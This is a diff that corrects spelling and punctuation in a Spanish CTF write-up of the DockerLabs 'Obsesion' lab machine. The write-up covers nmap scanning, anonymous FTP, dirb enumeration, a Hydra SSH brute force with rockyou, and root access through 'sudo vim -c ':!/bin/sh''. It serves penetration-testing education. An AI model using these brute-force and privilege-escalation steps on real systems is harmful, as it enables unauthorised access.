@@ -1,9 +1,11 @@
 # Write-up Obsesion
-> Maquina de Juan-Fecha de creación: 25/06/2024 https://dockerlabs.es/
+> Maquina de Dockerlabs https://dockerlabs.es/
+
+> Maquina de Juan-Fecha de creación: 25/06/2024
 
 > Fecha de creación del Write-up 20/02/2025
 
-# TODO LO QUE SE REALIZA EN ESTE DOCUMENTO ES CON FINES EDUCATIVOS, NO ME HAGO RESPONSABLE DEL USO INDEBIDO DE ESTA INFORMACIÓN.
+> ⚠️ TODO LO QUE SE REALIZA EN ESTE DOCUMENTO ES CON FINES EDUCATIVOS, NO ME HAGO RESPONSABLE DEL USO INDEBIDO DE ESTA INFORMACIÓN.⚠️ 
 
 
 
@@ -22,14 +24,14 @@ Durante todo el proceso del **Write-up** se demostrará con las diferentes herra
 | Herramientas     | Descripción                       | Versión    |
 |------------------|-----------------------------------|-----------|
 |**Nmap**| Permite descubrir dispositivos en la red, servicios, puertos...           | 7.94SVN  |
-| **Dirb**   | Permite a través de diferentes componentes de la herramienta buscar exploits para poder aprovecharse de las vulnerabilidades que existan.      | v2.22|
-| **Ftp**| Protocolo que permite conectarse al servicio de ftp de la máquina.      | 20230507-2+|
-| **ssh**   | Protocolo que permite conectarse por remoto a otroa máquina.      | OpenSSH_9.9p1 Debian-3, OpenSSL 3.3.2 3 Sep 2024|
+| **Dirb**   | Permite, a través de diferentes componentes de la herramienta, buscar exploits para poder aprovecharse de las vulnerabilidades que existan.     | v2.22|
+| **Ftp**| Protocolo que permite conectarse al servicio de archivos de la máquina.      | 20230507-2+|
+| **ssh**   | Protocolo que permite conectarse por remoto a otraa máquina.      | OpenSSH_9.9p1 Debian-3, OpenSSL 3.3.2 3 Sep 2024|
 | **Hydra**   | Herramienta que permite hacer pruebas de fuerza bruta indicando los diccionarios de prueba     | v9.5 (c) 2023|
 
 ## Instalación
 
-Antes de empezar deberemos desplegar la máquina vulnerable para que esté disponible durante todo el proceso de intrusión.
+Antes de empezar, deberemos desplegar la máquina vulnerable para que esté disponible durante todo el proceso de intrusión.
 ```bash
 
 'Le damos permisos de ejecución.'
@@ -65,10 +67,10 @@ Presiona Ctrl+C cuando termines con la máquina para eliminarla
 ```
 ## Proceso_de_explotación
 
-Ahora que la máquina ya esta disponible, pasaremos a comprobar qué servicios y puertos tiene abiertos a la red.
+Ahora que la máquina ya está disponible, pasaremos a comprobar qué servicios y puertos tiene abiertos a la red.
 
 ```bash
-'Deberemos de utilizar la herramienta Nmap con el parámetro -A para que compruebe puertos,servicios,scripts...'
+'Deberemos de utilizar la herramienta Nmap con el parámetro -A para que compruebe puertos, servicios, scripts...'
 
 ┌──(alema㉿alema)-[~/Escritorio/dockerlabs/Muy_facil/obsession]
 └─$ sudo nmap -A 172.17.0.2 
@@ -120,7 +122,7 @@ Nmap done: 1 IP address (1 host up) scanned in 21.04 seconds
 
 ```
 
-Tras hacer el escaneo, se puede observar que la máquina  tiene el servicio de ftp con la versión de vsftpd 3.0.5.Dentro de este,se puede ver que hay dos txt accesibles por el usuario Anonymous.
+Tras hacer el escaneo, se puede observar que la máquina  tiene el servicio de FTP con la versión de vsftpd 3.0.5. Dentro de este, se puede ver que hay dos txt accesibles por el usuario Anonymous.
 
 ```bash
 
@@ -186,15 +188,15 @@ Comprobamos el contenido de los archivos.
   permisos habilitados que no son del todo seguros...
 
 ```
-Al comprobar el contenido de los ficheros de la victima,podemos saber que tiene un archivo comprometedor y tambíen que tiene algunos permisos elevados.
+Al comprobar el contenido de los ficheros de la víctima, podemos saber que tiene un archivo comprometedor y también que tiene algunos permisos elevados.
 
 
-Para continuar con la investigación vamos a revisar los servicios que corren por el puerto 80.Si nos conectamos podemos ver la siguiente página web.
+Para continuar con la investigación, vamos a revisar los servicios que corren por el puerto 80. Si nos conectamos, podemos ver la siguiente página web.
 
 ![image](https://github.com/user-attachments/assets/e70bc3fc-cb0b-4303-a204-c1bd9e22fe4e)
 
 
-Ahora que hemos visto la página web,lo que deberiamos hacer es utilizar la herramienta dirb para poder listar todo el contenido que tenga,ya sea subdirectorios,documentos publicos o alguna vulnerabilidad
+Ahora que hemos visto la página web, lo que deberíamos hacer es utilizar la herramienta dirb para poder listar todo el contenido que tenga, ya sea subdirectorios, documentos públicos o alguna vulnerabilidad.
 
 ```bash  
 ┌──(kali㉿kali)-[~]
@@ -209,7 +211,7 @@ By The Dark Raver
 START_TIME: Thu Feb 13 16:04:59 2025
 URL_BASE: http://172.17.0.2/
 
-#Este es el diccionario que se utilizara.
+'Este es el diccionario que se utilizará.'
 
 WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
@@ -236,7 +238,7 @@ END_TIME: Thu Feb 13 16:05:01 2025
 DOWNLOADED: 4612 - FOUND: 2
 
 ```
-Si revisamos el contenido del comando dirb podemos ver que nos ha listado dos directorios,"backup" y "important".Al comprobar el contenido como indica la herramienta,podemos ver lo siguiente:
+Si revisamos el contenido del comando dirb podemos ver que nos ha listado dos directorios,"backup" y "important". Al determinar el contenido como indica la herramienta, podemos ver lo siguiente:
 
 En el directorio "http://172.17.0.2/important/" 
 
@@ -249,14 +251,14 @@ Como se observa, hay un .md  del cual no hay nada destacable de momento.
 
 En el directorio "http://172.17.0.2/backup/" 
 
-Aqui dentro hay un txt que indica el usuario por defecto que utiliza la victima para los servicios.
+Aqui dentro hay un txt que indica el usuario por defecto que utiliza la víctima para los servicios.
 
 ![image](https://github.com/user-attachments/assets/cdd32666-5577-4f0c-b27a-c80b0864a101)
 
-Si volveemos a revisar el nmap,podemos ver que tiene un servicio de ssh,asi que probaremos este usuario con la herramienta Hydra.
+Si volvemos a revisar el nmap, podemos ver que tiene un servicio de SSH, así que probaremos este usuario con la herramienta Hydra.
 
 ```bash  
-'Utilizamos el parametro -vV para poder ver los resultados que prueba.'
+'Utilizamos el parámetro -vV para poder ver los resultados que prueba.'
 ┌──(alema㉿alema)-[~]
 └─$ sudo hydra -l russoski  -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh  -vV
 
@@ -281,7 +283,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-22 10:25:
 [ATTEMPT] target 172.17.0.2 - login "russoski" - pass "ashley" - 19 of 14344400 [child 4] (0/1)
 [ATTEMPT] target 172.17.0.2 - login "russoski" - pass "qwerty" - 20 of 14344400 [child 1] (0/1)
 [ERROR] ssh protocol error
-****************************************TIEMPO DESPUES******************************************
+****************************************TIEMPO DESPUÉS******************************************
 [VERBOSE] Retrying connection for child 2
 [ATTEMPT] target 172.17.0.2 - login "russoski" - pass "987654321" - 82 of 14344400 [child 6] (0/1)
 [RE-ATTEMPT] target 172.17.0.2 - login "russoski" - pass "lovers" - 82 of 14344400 [child 2] (0/1)
@@ -312,7 +314,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-22 10:25:
 [ATTEMPT] target 172.17.0.2 - login "russoski" - pass "iloveme" - 113 of 14344400 [child 1] (0/1)
 [ATTEMPT] target 172.17.0.2 - login "russoski" - pass "sakura" - 114 of 14344400 [child 7] (0/1)
 [ATTEMPT] target 172.17.0.2 - login "russoski" - pass "adrian" - 115 of 14344400 [child 10] (0/1)
-#Despues de un tiempo podemos ver que ha encontrado la contraseña del usuario
+'Despues de un tiempo podemos ver que ha encontrado la contraseña del usuario'
 [22][ssh] host: 172.17.0.2   login: russoski   password: iloveme`
 
 [STATUS] attack finished for 172.17.0.2 (waiting for children to complete tests)
@@ -323,7 +325,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-22 10:25:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-22 10:26:07
                                                                                      
 ```
-Ahora que sabemos la contraseña,entraremos por el servicio ssh.
+Ahora que sabemos la contraseña, entraremos por el servicio SSH.
 
 ```bash  
 ┌──(alema㉿alema)-[~]
@@ -334,7 +336,7 @@ This key is not known by any other names.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
 russoski@172.17.0.2's password:
-'Ponemos la contraseña que hemos descubiertos.'
+'Ponemos la contraseña que hemos descubierto.'
 Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.11.2-amd64 x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -347,7 +349,7 @@ not required on a system that users do not log into.
 To restore this content, you can run the 'unminimize' command.
 Last login: Tue Jun 18 04:38:10 2024 from 172.17.0.1
 
-'Comprobamos el usuario'
+'Comprobamos el usuario.'
 
 russoski@f97682611d3e:~$ whoami
 russoski
@@ -364,7 +366,7 @@ russoski@f97682611d3e:~/Proyectos$ cd Documentos
 russoski@f97682611d3e:~/Proyectos$ cd ..
 russoski@f97682611d3e:~$ cd Documentos/
 
-'Podemos ver la fotografia que hablaba el usuario en el txt del servicio ftp.'
+'Podemos ver la fotografía que hablaba el usuario en el txt del servicio FTP.'
 
 russoski@f97682611d3e:~/Documentos$ ls
 'Nikola Tesla.jpg'
@@ -372,7 +374,7 @@ russoski@f97682611d3e:~/Documentos$
 
                                                                                      
 ```
-Si queremos ver la imagen que hablaba al principio el usuario,podriamos descargarla y asi comprobar si es posible la transferencia.
+Si queremos ver la imagen que hablaba al principio el usuario, podríamos descargarla y así comprobar si es posible la transferencia.
 
 ```bash  
 ┌──(alema㉿alema)-[~]
@@ -388,7 +390,7 @@ Nikola Tesla.jpg                                                                
                    
                                                                                      
 ```
-La imagen "Comprometida" es la siguiente:
+La imagen "comprometida" es la siguiente:
 
 ![image](https://github.com/user-attachments/assets/f30d37cb-ca68-41c2-abcd-93beec30b5a2)
 
@@ -397,8 +399,9 @@ La imagen "Comprometida" es la siguiente:
 
 Ahora para continuar, deberemos ver los permisos que tiene el usuario y si es posible elevar privilegios.
 
-```bash  
-'Con el siguiente comando podemos ver si el usuario en el que estamos,tiene algun tipo de permiso.'
+```bash
+
+'Con el siguiente comando podemos ver si el usuario en el que estamos, tiene algún tipo de permiso.'
 
 russoski@f97682611d3e:~/Documentos$ sudo -l
 Matching Defaults entries for russoski on f97682611d3e:
@@ -410,17 +413,17 @@ russoski@f97682611d3e:~/Documentos$
 
 ```
 
-Si nos fijamos en el resultado, podemos ver que tiene permisos con la herramienta vim.Tras saber esto,podemos consultar en la pagína GTFObins para ver que tipo  de vulnerabilidades existen para poder elevar permisos.
+Si nos fijamos en el resultado, podemos ver que tiene permisos con la herramienta vim. Tras saber esto, podemos consultar en la pagína GTFObins para ver qué tipo  de vulnerabilidades existen para poder elevar permisos.
 
 
 ![image](https://github.com/user-attachments/assets/16557a55-297a-45ff-9d57-b2bbe93fbf67)
 
 
-En este apartado,deberemos entrar en el apartado de "sudo" y comprobar que podemos hacer.Si leemos los diferentes apartados,podemos ver que hay un comando para entrar a una shell interactica dentro de vim.
+En este apartado, deberemos entrar en el apartado de "sudo" y comprobar qué podemos hacer. Si leemos los diferentes apartados, podemos ver que hay un comando para ingresar a una shell interactiva dentro de vim.
 
 ![image](https://github.com/user-attachments/assets/407b58fd-0333-41f5-9c78-84eb574b268a)
 
-Si utilizamos esto dentro del ssh,podremos ver que si que podemos entrar como root.
+Si utilizamos esto dentro del SSH, podremos ver que sí que podemos entrar como root.
 
 ```bash  
 russoski@f97682611d3e:~/Documentos$ sudo vim -c ':!/bin/sh'
@@ -431,7 +434,7 @@ root
 
 ```
 
-Con esto se da por acabado la intrusión a la maquina obsession
+Con esto se da por acabado la intrusión a la máquina obsession.
 
 
 
